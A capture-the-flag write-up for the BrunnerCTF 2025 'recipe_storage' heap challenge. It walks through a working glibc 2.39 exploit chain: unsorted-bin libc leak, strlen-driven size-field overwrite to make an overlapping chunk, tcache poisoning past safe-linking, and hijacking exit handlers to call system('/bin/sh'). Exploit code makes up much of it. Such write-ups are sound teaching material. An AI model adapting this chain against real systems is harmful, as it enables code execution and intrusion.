---
layout: post
title:  "BrunnerCTF 2025: pwn_recipe-storage"
date:   2025-08-25 06:50:19 +0200
author: cl1nical
hidden: true
---
### Description
- **CTF:** [BrunnerCTF 2025](https://ctftime.org/event/2835)
- **Challenge Author:** Zopazz
- **Category**: Pwn
- **Theme:** Linux Heap
- **Difficulty:** Hard
- **Libc:** 2.39

### Files
Click [here](/binaries/BrunnerCTF2025_pwn_recipe-storage.zip) to download a zip folder of the challenge files (including writeup.py).

### Techniques used
- Libc leak via unsorted bin
- Size field overwrite to create a fake overlapping chunk
- Heap leak via tcache head ptr, utilizing overlapping fake chunk
- Tcache poison
- Exit handlers exlpoitation

### Overview
This challenge could be solved by creating a large chunk on the heap, filling it with A's. This would lead to a bug where the attacker could modify the size field of an adjacent chunk to create a large fake chunk on the heap that overlapped smaller chunks. Once this chunk was accepted by **malloc/free** the larger chunk would be used to overwrite the **next** ptr in the smaller tcache chunks, turning it into a tcache poison attack. This tcache poison was then used to leak important information in the linker, effectively exlpoiting the **run_exit_handlers** inside the **exit** function.

### Part 1: Finding the bug
First I ran **file** and **pwn checksec** on the binary to see what we were dealing with:
```
recipe_storage: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV),
dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]
=ba13aacb302fa027087ab84242ffb3d138d94d46, for GNU/Linux 3.2.0, not stripped
```

```
Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
As you can see from the output above, the binary has full protections enabled and is not stripped. This means we are able to decompile and debug using symbols.<br>

Since we are provided the libc and linker, I used pwninit to patch the binary:<br>
```
pwninit --ld ld-linux-x86-64.so.2 --libc libc.so.6 --bin recipe_storage
```

Then I opened the program in Ida and spent some time inspecting the different functions. At a first glance, the challenge *looks* like a regular heap notebook challenge, like the one I have as the POC binary. After inspecting it further it would become evident that this was not the case. I will present the important bugs/features of this binary in the section below, using pictures and a description:<br>

Inside **create_recipe** we can see that allocations up to 0x2000 bytes are allowed:<br>
<img src="/assets/images/linux/heap/writeups/recipe_storage/recipe_ida_1.png" style="width:100%; height:100%;" />
<br>

Clicking into the **get_idx** function inside of **create_recipe** we can see that the indexes allowed are 1-15. Although I will not show it here, the **getnum** function will return an unsigned int - so no minus indexing shenanigans.
Also in this function there is no check to see if an index is already in use. This means that we can overwrite the chunk ptr at a given index if we allocate on the same index twice. This means that we have unlimited allocations as long as the index is 1-15. If we do overwrite and index, the ptr to the old chunk will be overwritten and thus we cannot refer to the old chunk:<br>
<img src="/assets/images/linux/heap/writeups/recipe_storage/recipe_ida_6.png" style="width:100%; height:100%;" />
<br>

Inside **detlete_recipe** we can see on line 12 that the index containing the allocation ptr is set to null when a chunk is freed. This removes a UAF since the **print_recipe** and **edit_recipe** functions will check if these are null before using them:
<img src="/assets/images/linux/heap/writeups/recipe_storage/recipe_ida_2.png" style="width:100%; height:100%;" />
<br>


Since malloc is used, the memory is not nulled when allocating it, leaving the edit function vulnerable because it uses strlen (this can be exploited because writable char bytes are left on the heap) allowing the attacker to modify the size value of the next chunk. The actual layout of the heap with this will be displayed later: <br>
<img src="/assets/images/linux/heap/writeups/recipe_storage/recipe_ida_3.png" style="width:100%; height:100%;" />
<br>
NOTE: All functions are compiled with canary, meaning that getting an allocation on **create_recipe's** return ptr is not possible because the ret addr is 8 byte aligned, tcache requires 16 byte alignment and this would lead to an accidental canary overwrite by the size field, triggering the canary. For this reason, the **exit** exploit was used instead<br>

### Part 2: Leaking libc from unsortedbin
Using the code snippet below, we allocate a chunk too large to go into the tcache bins (larger than 0x410), which will put it into the unsortedbin when we free it. Also, we allocate a guard chunk to prevent top chunk consolidation:<br>
```
malloc(0, 0x420, b"A"*0x60)
malloc(1, 0x20, b"B")
free(0)
malloc(0, 0x420, b"A")

leak = puts(0)
leak = bytearray(leak)
leak[0] = 0x20
leak = u64(leak.ljust(8,b"\x00"))
libc_leak = leak
print("leak:", hex(leak))
libc = leak - 0x203b20
print("libc:", hex(libc))
```
The picture below shows the state of the heap for clarification:<br>
<img src="/assets/images/linux/heap/writeups/recipe_storage/recipe_gdb_1.png" style="width:100%; height:100%;" />
<br>
And the leak confirmed in the terminal:<br>
<img src="/assets/images/linux/heap/writeups/recipe_storage/recipe_terminal_1.png" style="width:100%; height:100%;" />
<br>

### Part 3: Attacking the unsorted bin
Next up we will overwrite the chunk0 ptr with a new and much larger chunk0 of size 0x840. We do not have to worry about the old chunk0 anymore, as it has served its purpose. The large chunk0 that we allocate will be used to attack the unsortedbin by putting a fake chunk into it. The next code snippet below, shows that we allocate a large chunk0. It also shows that we allocate some smaller 0x70 size chunks (remember 0x60+0x10 for metadata) that will be used for both tcache poisoning (later) as well as creating some more distance from the middle of the large chunk, so we can allocate some more smaller chunks that can contain fake size fields (next code snippet) at the right offsets, in order to trick **free** into putting the fake chunk in the unsortedbin. The reason behind this is that we can change the ptrs in the smaller chunks if there is a large overlapping fake chunk on the heap that we control:<br>
```
malloc(0, 0x840, b"A"*0x840)

malloc(1, 0x60, b"A")
malloc(2, 0x60, b"B")
malloc(3, 0x60, b"C")

```
The heap now looks like this:<br>
<img src="/assets/images/linux/heap/writeups/recipe_storage/recipe_gdb_2.png" style="width:100%; height:100%;" />
<br>
And farther down the heap:
<br>
<img src="/assets/images/linux/heap/writeups/recipe_storage/recipe_gdb_3.png" style="width:100%; height:100%;" />
<br>
Next up we allocate 2 smaller chunks of size 0x60 from the **top_chunk**. These will be used to write fake size fields at the correct address, in order to trick **free**:
```
p = b"A"*64
p += p64(0x00)
p += p64(0x71)
malloc(4, 0x60, p)

p = b"H"*64
p += p64(0)
p += p64(0x71)
malloc(5, 0x60, p)
```
The 2 chunks in the code snippet above makes the end of our allocations look like this:
<br>
<img src="/assets/images/linux/heap/writeups/recipe_storage/recipe_gdb_4.png" style="width:100%; height:100%;" />
<br>
I know it might be confusing that I used 0x70 as fake size fields when the smaller 0x70 chunks were also 0x70. The 0x71 fields with A's or H's leading up to them are the fake ones. The first one with A's leading up to it at address 0x55555555c0e0 is the one that will be at 0x5c0 away from the beginning of the 0x5c0 chunk that we will allocate in a moment. The other one at address 0x55555555c150 with the H's leading up to it is the second one that was nescessary to convince **free** that the chunk adjacent to the 0x5c0 chunk was a 0x70 size chunk.<br>

Now we will free the 0x840 (at index 0) and then allocate two smaller chunks instead.<br>
```
free(0)

malloc(0, 0x420, b"C"*0x50)

p = b"Z"*0x428

edit(0, p)

malloc(6, 0x410, b"V"*0x410)
```

Free chunk at index 0 and allocate smaller one:<br>
<img src="/assets/images/linux/heap/writeups/recipe_storage/recipe_gdb_5.png" style="width:100%; height:100%;" />
<br>

<img src="/assets/images/linux/heap/writeups/recipe_storage/recipe_gdb_6.png" style="width:100%; height:100%;" />
<br>
And after allocating the 2nd chunk (index 6)
<img src="/assets/images/linux/heap/writeups/recipe_storage/recipe_gdb_7.png" style="width:100%; height:100%;" />
<br>
NOTE: In the above picture on address 0x55555555bb20 you can clearly see the **strlen** bug in effect. When **strlen** is called on the chunk at index 0 (containing Z's), it will allow the attacker to edit the two bytes in the size field of the adjacent chunk (containing V's).<br> 

In the next code snippet, we will do the actual overwrite of the size field:<br>
```
# Overwrite the size field of chunk6
# by using chunk0 right behind chunk6
p = b"D"*0x420
p += p64(0) # chunk 0 itself is 0 since still allocated
p += p16(0x5b1 + 0x10) # remember prev in use (chunk0 is in use)
edit(0, p)
```
Resulting in:<br>
<img src="/assets/images/linux/heap/writeups/recipe_storage/recipe_gdb_8.png" style="width:100%; height:100%;" />
<br>
And remember that we set up the 0x71 fake size field at the correct offset from the 0x5c0 size field on address 0x55555555c0e0 which has the distance of 0x5c0 from our 0x5c0 fake size field:<br>
<img src="/assets/images/linux/heap/writeups/recipe_storage/recipe_gdb_9.png" style="width:100%; height:100%;" />
<br>
Next up, we free the chunks at index 6 and then at index 4:<br>
```
free(6)
```
This will make the heap look like this (0x5c0 chunk successfully freed):<br>
<img src="/assets/images/linux/heap/writeups/recipe_storage/recipe_gdb_10.png" style="width:100%; height:100%;" />
<br>
And the chunk with A's have had its fake size field modified so that prev-in-use is 0 and also the prev-size field is set to 0x5c0 which can be seen at address 0x55555555c0e0 in the picture below:<br>
<img src="/assets/images/linux/heap/writeups/recipe_storage/recipe_gdb_11.png" style="width:100%; height:100%;" />
<br>
From now on, malloc and free will accept the 0x5c0 chunk and this means that, when we **free** or **malloc** the 0x5c0 chunk they will set the prev-in-use field and prev-size field at address 0x55555555c0e0.<br>

Now we will free the first tcache chunk that was allocated, because it is adjacent to the 0x5c0 chunk. Since it is the only chunk in the 0x70 tcache bin it will contain the value 0x000000055555555c which we can leak and use to compute the heap base which is 0x55555555b000. The leak can occur, since we will allocate our 0x5c0 chunk right behind it, and it is overlapping the free tcache chunk:<br>
```
free(1)

p = b"G"*0x420
malloc(6, 0x5b0, p)
```
The heap looks like this. What you see is the 0x5c0 chunk being allocated with enough letters to reach the heap ptr in the free tcache chunk (0x5c0 chunk now contains G's):<br>
<img src="/assets/images/linux/heap/writeups/recipe_storage/recipe_gdb_13.png" style="width:100%; height:100%;" />
<br>
Then we use the following to compute the heap base: <br>
```
leak = puts(6)[0x420:0x428]
leak = u64(leak.ljust(8,b"\x00"))
print("leak hex:",hex(leak))
heap = leak << 12
print("heap base:",hex(heap))
```
And in the terminal:<br>
<img src="/assets/images/linux/heap/writeups/recipe_storage/recipe_terminal_2.png" style="width:100%; height:100%;" />
<br>

But since we just overwrote the size field of the first tcache chunk with G's we now need to correct this. We can edit the 0x5c0 chunk using the edit function and then allocate the first tchache chunk again without problems (tcache chunk is at index 1):<br>
```
p = b"G"*0x410
p += p64(0)
p += p64(0x71)
edit(6,p)

malloc(1, 0x60, b"A")
```
And the heap looks like:<br>
<img src="/assets/images/linux/heap/writeups/recipe_storage/recipe_gdb_15.png" style="width:100%; height:100%;" />

### Part 4: Using tcache poison
To make a summary: We have a fake 0x5c0 chunk on the heap that we control. This chunk is overlapping smaller chunks that can be used for tcache poisoning, since the large chunk can be used to overwrite the **next** ptrs. Also remember the heap leak that we made, which is important to defeat the safe-linking that modern tcache uses. I have another blog post [here](/2025/08/13/safe-linking.html) that details this mechanism.<br>
Now we will use the tcache poison to leak a value in the linker, effectively defeating the linker's ASLR (which is not the same as libc's ASLR in ubuntu 24). This you can verify in the picture below where I have enabled ASLR:<br>
<img src="/assets/images/linux/heap/writeups/recipe_storage/recipe_gdb_16.png" style="width:100%; height:100%;" /> <br>

The code snippet below shows a tcache poison that overwrites the **next** ptr of the tcache chunk at index 1. We will be using this to leak a linker address value from __nptl_rtld_global that resides in the rw section of libc and contains a linker address<br>
```
free(2)
free(1)

# addr of tcache chunk we want to overwrite
home = heap + 0xf50
nptl = libc + 0x2046b8 - 24 # nptl (contains linker ptr (rtld)). Allocate a little before
addr = mangle(home, nptl)

free(6)

p = b"N"*0x410
p += p64(0)
p += p64(0x71)
p += p64(addr)
malloc(6, 0x5b0, p)

malloc(7, 0x60, b"A")

p = b"A"*25
malloc(8, 0x60, p)
```
And then inspecting __nptl_rtld_global in libc we find this:<br>
<img src="/assets/images/linux/heap/writeups/recipe_storage/recipe_gdb_17.png" style="width:100%; height:100%;" /> <br>
<br>
In the above picture, you can see that we needed to overwrite the LSB at __nptl_rtld_global since it was \x00. We just need to correct this byte back to \x00, since the offset will always be this value:<br>
```
leak = puts(8)
leak = leak[25:24+8]
leak = u64(leak.ljust(8,b"\x00"))
_rtld_global_leak = leak

# shift address 8 bits left to accomodate for the missing '00' in LSB
_rtld_global = _rtld_global_leak << 8
print("_rtld_global_leak:",hex(_rtld_global_leak))
print("_rtld_global:",hex(_rtld_global))

linker = _rtld_global - 0x38000
print("linker base:",hex(linker))
```
<br>
And in the terminal:<br>
<img src="/assets/images/linux/heap/writeups/recipe_storage/recipe_terminal_3.png" style="width:100%; height:100%;" />
<br>

### Part 5: Exploiting **run_exit_handlers**
For this part we will keep exploiting our tcache poison to read and write values in the correct places.<br>

Note: I highly recommend that you check out the **get_cookie** and **ptr_mangle** functions in **writeup.py**.<br>

Now that we know where the linker is, we need to leak an important encrypted function from the **initial** struct in the linker. This struct contains an encrypted function called **dl_fini** that is used in **exit**. We know the offset of the **initial** struct because we have the linker base and we can also calculate the plaintext ptr of the **dl_fini** function.<br> Then you might ask: Why do we need both the encryted and the plaintext version of **dl_fini**? <br>
This is because **run_exit_handlers** will decrypt the encrpyted **dl_fini** before calling it. If this decryption does not result in anything useful, the program will segfault. So what we need to do is put and encrypted version of **system** in the **initial** struct so that **run_exit_handlers** will call this instead. In the picture below you can see the decryption I am talking about (in this case **system** has already been written in **initial**):<br>
<img src="/assets/images/linux/heap/writeups/recipe_storage/recipe_gdb_18.png" style="width:100%; height:100%;" />
<br>
The next code chunk I will show is quite long, but is basically what I just described in the section above. The code contains comments for better understanding:<br>
```
# dl_fini is a function the linker
_dl_fini = linker + 0x5380
print("_dl_fini:",hex(_dl_fini))

# Now we need to leak the encrypted _dl_fini from the initial struct
# and then we can calculate
# the 'linker cookie' which is used to encrypt linker function ptrs
# in order to make it harder for an attacker to make this kind of attack
# by directly overwriting function ptrs

# Allocate some extra chunks we can use
malloc(10, 0x60, b"A")
malloc(11, 0x60, b"B")
malloc(12, 0x60, b"C")

free(10)
free(7) # same as before

initial = libc + 0x204fc0 # contains encryped _dl_fini (which is a linker function)
print("initial (contains enc dl_fini):",hex(initial))
home = heap + 0x7f0 # same as before
target = initial
addr = mangle(home, target)

# Use the 0x5c0 chunk again
free(6)

p = b"N"*0x410
p += p64(0)
p += p64(0x71)
p += p64(addr)
malloc(6, 0x5b0, p)

# write 24 A's to cover the gap down to enc _dl_fini
p = b"A"*24

malloc(7, 0x60, b"B")
malloc(14, 0x60, p)

# leak the encrypted _dl_fini
leak = puts(14)
leak = leak[24:24+8]
leak = u64(leak.ljust(8,b"\x00"))
enc_dl_fini = leak

# print the values and calculate the linker cookie value
print("enc_dl_fini:", hex(enc_dl_fini))
l_cookie = get_cookie(enc_dl_fini, _dl_fini)
print("l_cookie:",hex(l_cookie))

```
The initial struct looks like:<br>
<img src="/assets/images/linux/heap/writeups/recipe_storage/recipe_gdb_19.png" style="width:100%; height:100%;" />
<br>
And the terminal looks like:<br>
<img src="/assets/images/linux/heap/writeups/recipe_storage/recipe_terminal_4.png" style="width:100%; height:100%;" />
<br>
Now comes the last part of the exploit, where we allocate another chunk on top of the initial struct and use this chunk to write the encrypted system as well as the address of '/bin/sh' (calculated from libc) so that **exit** will call **system(/bin/sh)**:<br>
```
# since we cannot edit all the way to initial+32 because of the strlen
# function, we need to alloc a new tcache chunk on top of the old one
# We cannot free chunk 14 since it will kill the program

free(12)
free(7)

free(6)

p = b"N"*0x410
p += p64(0)
p += p64(0x71)
p += p64(addr)
malloc(6, 0x5b0, p)

binsh = libc + 0x1cb42f
system = libc + 0x58750

# encrypt system
enc_system = ptr_mangle(system, l_cookie)

# restore the values at initial and also overwrite enc dl_fini with enc system
# first arg to system will be taken from initial+32 - does not need to be encryped
# to give overview
p = p64(0) # initial+0
p += p64(1) # initial+8
p += p64(4) # initial+16
p += p64(enc_system) # initial+24
p += p64(binsh) # initial+32

malloc(2, 0x60, b"A")
malloc(3, 0x60, p)

# call exit
io.sendlineafter(b"> ", b"5")

io.interactive()
```
<br>
And in **run_exit_handlers** called by **exit** we see that **system(/bin/sh)** is called:<br>
<img src="/assets/images/linux/heap/writeups/recipe_storage/recipe_gdb_20.png" style="width:100%; height:100%;" />
<br>
The terminal (running with ASLR):<br>
<img src="/assets/images/linux/heap/writeups/recipe_storage/recipe_terminal_5.png" style="width:100%; height:100%;" />

### Credits
Thanks to Zopazz for creating an interesting and different heap challenge!<br>

And a special thanks to Anakin from Brunnerne for teaching me the **run_exit_handlers** exploit back in January while also providing the python functions for extracting linker cookie as well as encrypting function ptrs with it.





